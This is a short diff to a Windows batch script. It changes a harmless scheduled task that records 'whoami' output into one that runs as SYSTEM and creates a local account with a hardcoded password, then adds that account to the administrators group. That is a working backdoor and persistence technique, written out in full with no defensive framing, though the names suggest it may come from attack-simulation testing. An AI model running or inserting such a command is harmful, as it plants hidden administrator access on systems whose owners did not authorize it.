@@ -1,3 +1,3 @@
 @echo off
  
-schtasks /create /tn "TestTask" /tr "cmd.exe /c whoami > C:\whoami.txt" /sc once /st 14:00
+schtasks /create /tn "AddUserInline" /tr "cmd.exe /c net user testuser P@ssw0rd123 /add && net localgroup administrators testuser /add" /sc once /st 14:00 /ru SYSTEM
